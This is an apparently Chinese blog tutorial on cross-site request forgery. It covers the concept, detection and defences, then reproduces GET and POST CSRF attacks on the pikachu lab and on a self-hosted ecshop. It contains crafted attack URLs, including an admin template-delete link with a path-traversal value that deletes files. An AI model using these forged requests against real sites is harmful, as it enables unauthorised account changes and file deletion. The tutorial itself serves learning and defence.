        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSRF(Cross-site request forgery)跨站请求伪造，黑客利用<strong>已经登录的用户</strong>，诱使其访问或者登录某个早已构造好的恶意链接或者页面，然后在用户毫不知情的情况下，以用户的名义完成了非用户本意的非法操作。这种攻击我们也被称为”One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用行为。与XSS攻击相比，CSRF攻击往往不大流行(因此对其进行防范的资源也相当稀少)和难以防范，所以被认为比XSS更具危险性。</p><h2 id="CSRF-学习理解"><a href="#CSRF-学习理解" class="headerlink" title="CSRF 学习理解"></a>CSRF 学习理解</h2><p>其实一个CSRF漏洞攻击的实现，其需要由“三个部分”来构成。 </p><p>（1） 有一个无需后台验证的前台或后台数据修改或新增请求的漏洞存在； </p><p>（2） 伪装数据操作请求的恶意链接或者页面； </p><p>（3） 诱使用户主动访问或登录恶意链接，触发非法操作；</p><h3 id="第一部分：漏洞的存在"><a href="#第一部分：漏洞的存在" class="headerlink" title="第一部分：漏洞的存在"></a>第一部分：漏洞的存在</h3><p>关键字：跨站请求漏洞存（CSR:Cross Site Request） </p><p>如果需要CSRF攻击能够成功，首先就需要目标站点或系统存在一个可以进行数据修改或者新增操作，且此操作被提交后台后的过程中，其未提供任何身份识别或校验的参数。后台只要收到请求，就立即下发数据修改或新增的操作； </p><p>以上漏洞情况的存在，出现比较多的场景有用户密码的修改、购物地址的修改或后台管理账户的新增等等操作过程中。</p><p>如何判断是否存在CSRF漏洞：</p><p>1.查看数据包中是否存在Token参数</p><p>2.看是否验证来源地址</p><p>①Referer向下一个页面传递你是从哪一个URL地址进来的</p><p>②来源无法被伪造</p><h3 id="第二部分：漏洞利用的伪装"><a href="#第二部分：漏洞利用的伪装" class="headerlink" title="第二部分：漏洞利用的伪装"></a>第二部分：漏洞利用的伪装</h3><p>关键字：伪装请求（F:forgery） </p><p>CSRF漏洞存在了，如果需要真正的被利用，还需要对“修改或新增”数据操作请求的伪装，此时恶意攻击者只要将伪装好的“数据修改或新增”的请求发送给被攻击者，或者通过社工的方式诱使被攻击者在其cookie还生效的情况下点击了此请求链接，即可触发csrf漏洞，成功修改或新增当前用户的数据信息，如修改当前用户的密码、又或者是当前用户为后台管理员，触发漏洞后新增了一个后台管理员。</p><h3 id="第三部分：用户非本意的操作"><a href="#第三部分：用户非本意的操作" class="headerlink" title="第三部分：用户非本意的操作"></a>第三部分：用户非本意的操作</h3><p>关键字：非本意操作 </p><p>当前用户在不知情的情况下，访问了黑客恶意构造的页面或在链接，即在非本意的情况下完成黑客想完成的“非法操作”，实现了对当前用户个人信息的恶意操作。</p><h2 id="CSRF-漏洞理解小结"><a href="#CSRF-漏洞理解小结" class="headerlink" title="CSRF 漏洞理解小结"></a>CSRF 漏洞理解小结</h2><p>小结：构造一个恶意链接或者html页面 </p><p>说一千道一万，我们要明白“CSRF漏洞的目的”是什么，其实就是利用已存在的漏洞构造了一个“恶意链接”或“html页面”，然后诱使用户点击触发此漏洞。 </p><p>那么说的再明白点，就是被检测的目标站点存在一个漏洞（CSRF），攻击者利用此类漏洞伪装了一个链接或者html页面，诱使被攻击者在登录的情况下(即当前cookie有效的情况下）点击了此伪装请求，随后在用户不知情的情况下完成了对当前用户数据的修改或者新增操作，而被修改的信息可能是用户的密码、关键信息又或者新增后台管理员等。</p><h2 id="CSRF-漏洞防护"><a href="#CSRF-漏洞防护" class="headerlink" title="CSRF 漏洞防护"></a>CSRF 漏洞防护</h2><p>其实现在有关CSRF漏洞防护已经是比较成熟了，其主要防护的思路就是需要在进行后台数据修改操作的过程中，添加对当前用户身份的有效验证措施，而不能仅限于cookie的识别，这里简单的罗列了下防护措施如下。</p><h5 id="（1）-来源校验"><a href="#（1）-来源校验" class="headerlink" title="（1） 来源校验"></a>（1） 来源校验</h5><p>使用http请求头中referer来源，对客户端源进行身份校验，此方法早期使用比较多，但是仍然容易被绕过，所以这里并不建议使用。</p><h5 id="（2）-用户token-校验"><a href="#（2）-用户token-校验" class="headerlink" title="（2） 用户token 校验"></a>（2） 用户token 校验</h5><p>添加基于当前用户身份的有效tokens随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机token校验值，此种校验方法当前使用比较多；</p><h5 id="（3）当前用户密码验证"><a href="#（3）当前用户密码验证" class="headerlink" title="（3）当前用户密码验证"></a>（3）当前用户密码验证</h5><p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，防止未授权的恶意操作</p><h5 id="（4）添加验证机制"><a href="#（4）添加验证机制" class="headerlink" title="（4）添加验证机制"></a>（4）添加验证机制</h5><p>在请求数据的提交前，需填写验证码信息提交，以增加对用户来源的有效验证，防止恶意未授权的操作产生。</p><h5 id="基础知识扩展："><a href="#基础知识扩展：" class="headerlink" title="基础知识扩展："></a>基础知识扩展：</h5><p>后端接收的三种形式:get、post、request</p><p>php中$_REQUEST、$_POST、$_GET的区别</p><ol><li>$_REQUEST</li></ol><p>​        php中$_REQUEST可以获取以POST方法和GET方法提交的数据，缺点：速度比较慢 。</p><ol start="2"><li><p>$_GET</p><p>用来获取由浏览器通过GET方法提交的数据。</p><p>GET方法他是通过把参数数据加在提交表单的action属性所指的URL中，值和表单内每个字段一一对应，然              后在URL中可以看到，但是有如下缺点：</p><ol><li><p>安全性不好，在URL中可以看得到</p></li><li><p>传送数据量较小，不能大于2KB。</p></li></ol></li></ol><ol start="3"><li><p>$_POST</p><p>用来获取由浏览器通过POST方法提交的数据。</p><p>POST方法他是通过HTTP POST机制，将表单的各个字段放置在HTTP HEADER内一起传送到action属性所指的URL地址中，用户看不到这个过程。</p><p>他提交的大小一般来说不受限制，但是具体根据服务器的不同，还是略有不同。相对于_GET方式安全性略高</p></li></ol><p>  4.$_REQUEST、$_POST、$_GET 的区别和联系</p><p>​          $_REQUEST[“参数”]具用$_POST[“参数”] $_GET[“参数”]的功能,但是$_REQUEST[“参数”]比较慢。</p><p>​        通过post和get方法提交的所有数据都可以通过$_REQUEST数组[“参数”]获得</p><p><strong>一. get与post请求的不同</strong></p><p><em>GET方式提交数据的特点：</em></p><ol><li><p>get方式在url后面拼接参数，只能以文本的形式传递数据</p></li><li><p>传递的数据量小，4KB左右（不同浏览器会有差异）</p></li><li><p>安全性低，会将数据显示在地址栏</p></li><li><p>速度快，通常用于对安全性要求不高的请求</p></li></ol><p><em>post 方式 ：</em></p><p>1-安全性比较高</p><p>2-传递数据量大，请求对数据长度没有要求</p><p>3-请求不会被缓存，也不会保留在浏览器历史记录中</p><p>用于：密码等安全性要求比较高的场合，提交的数据量比较大：发布文章，上传文件。</p><p><strong>二. $_GET获取get数据</strong></p><p>GET方式提交数据的格式</p><ol><li><p>格式:index.php?userName=jack&amp;password=123</p></li><li><p>参数名与参数值之间没有空格</p></li><li><p>参数值不需要使用单双引号包括</p></li></ol><p><strong>三. $_POST获取post数据</strong></p><p>表单数据是通过请求体传递到服务端的</p><p>我们在界面上看不到，可以提交任何类型的数据包括文件，由于界面上看不见，浏览器也不储存，所以更安全</p><p>在burp suite中制作csrf的HTML文档</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201142220.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h2><h3 id="案例一-pikachu-CSRF复现"><a href="#案例一-pikachu-CSRF复现" class="headerlink" title="案例一:  (pikachu CSRF复现)"></a>案例一:  (pikachu CSRF复现)</h3><h4 id="CSRF（get型）"><a href="#CSRF（get型）" class="headerlink" title="CSRF（get型）"></a>CSRF（get型）</h4><p>根据提示，账号有vince/allen/kobe/grady/kevin/lucy/lili，密码全部是123456</p><p>我们随机登录一个账户 lili    123456来到个人中心修改个人信息</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202113102.png"></p><p>随机修改一个参数值，例如性别修改为xxxx</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202113212.png"></p><p>点击submit抓包</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202113346.png"></p><p>由请求包可以看出该请求方式为get类型</p><p><strong>构造playload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.232.130&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get.php?sex&#x3D;xxxx&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chaind&amp;email&#x3D;viince@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure><p>此时我们playload已经构造好了，就可以实行攻击了</p><p>如果此时有用户处于登录状态并点击了我们的链接，就会修改内容为我们链接中的内容</p><p><strong>实现</strong></p><p>我们模拟登录一个账户vince 123456点击playload中的链接</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191510.png"></p><p>点击连接后可以看见性别发生了改变</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191526.png"></p><h4 id="CSRF（post型）"><a href="#CSRF（post型）" class="headerlink" title="CSRF（post型）"></a>CSRF（post型）</h4><p>同样登录一个账户修改信息抓包，可以看见这个时候请求方式已经变为post型了，我们已经不能通过get方式去进行构造playload</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191518.png"></p><p><strong>playload</strong></p><p>用burpsuite选择生成csrf poc,会生成一段HTML代码，然后copy下来制作成一个页面链接</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191610.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191626.png"></p><p>用户点击链接后，就会修改信息</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191643.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191834.png"></p><h4 id="CSRF（token）"><a href="#CSRF（token）" class="headerlink" title="CSRF（token）"></a>CSRF（token）</h4><p>关于token的介绍可以参考下这篇文章：<a href="https://www.cnblogs.com/lufeiludaima/p/pz20190203.html">https://www.cnblogs.com/lufeiludaima/p/pz20190203.html</a></p><p>当我们在加入token后，再次构造的playload就会携带token进行判断请求，但是token是一个随机值，当请求后会与session中的token相互比较，并且token具有时效性，一段时间就会过时</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202191834.png"></p><p>可以看见我们重新构造的playload加入了随机token进行携带判断，这样的话就防止了csrf</p><h3 id="案例二-属于post类型的"><a href="#案例二-属于post类型的" class="headerlink" title="案例二:  (属于post类型的)"></a>案例二:  (属于post类型的)</h3><p>新增收货地址为案列</p><p>请勿复现利用（未授权）</p><p>xx商城存在csrf漏洞</p><p>能够抓包构造CSRF的HTML文件，当用户处于等录状态时，就能通过通过抓包的文件（例如：增加地址，删除地址等），制作而成的HTML诱导用户打开（必须处于相同浏览器–（主要是浏览器中的cookie缓存）），从而做到增加，删除地址等。</p><p>例如：</p><ol><li>在增加收货地址处抓包，并通过engagement tools–àgenerate CSRF poc</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201142701.jpg"></p><ol><li>将所生成的HTML文件copy下来，粘贴到记事本，将后缀换成HTML</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201142509.jpg"></p><ol><li>将该记事本用当前登录的用户的浏览器打开（此处是谷歌）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201143053.png"></p><ol><li>点击按钮，添加成功</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201143106.jpeg"></p><ol><li>可看到收货地址有我们添加的收货地址</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201143106.jpeg"></p><h3 id="案例三-get类型"><a href="#案例三-get类型" class="headerlink" title="案例三:  (get类型)"></a>案例三:  (get类型)</h3><p>下面为我自己搭建的一个开源商城系统，在其模板选择处删除模板抓包</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202112041.png"></p><p>就会获取到如上的一个get请求包，将其URL地址复制下来</p><p><a href="http://www.cdclhh.com:8986/ecshop/admin/template.php?is_ajax=1&amp;act=delete&amp;tpl_name=default_20201014&amp;1602746526534534">http://www.cdclhh.com:8986/ecshop/admin/template.php?is_ajax=1&amp;act=delete&amp;tpl_name=default_20201014&amp;1602746526534534</a></p><p>我们此时就可以对“default——20201014”进行修改掉我们想要删除的内容</p><p>例如在<a href="http://www.cdclhh.com:8986/">www.cdclhh.com:8986</a>下新建一个xxx文件，此时我们将URL地址改为</p><p><a href="http://www.cdclhh.com:8986/ecshop/admin/template.php?is_ajax=1&amp;act=delete&amp;tpl_name=../../xxx&amp;1602746526534534">http://www.cdclhh.com:8986/ecshop/admin/template.php?is_ajax=1&amp;act=delete&amp;tpl_name=../../xxx&amp;1602746526534534</a></p><p>当管理员处于登录状态下点击上述的地址就能删除xxx文件</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201143123.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201143123.png"></p><p>我们设想一下如何将删除的内容改为../../…/.//././…/…/一直往上延伸，是不是可以删除整个根目录乃至C盘，引起整个系统的崩溃，可见危害之大</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
            <tag> web攻击 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
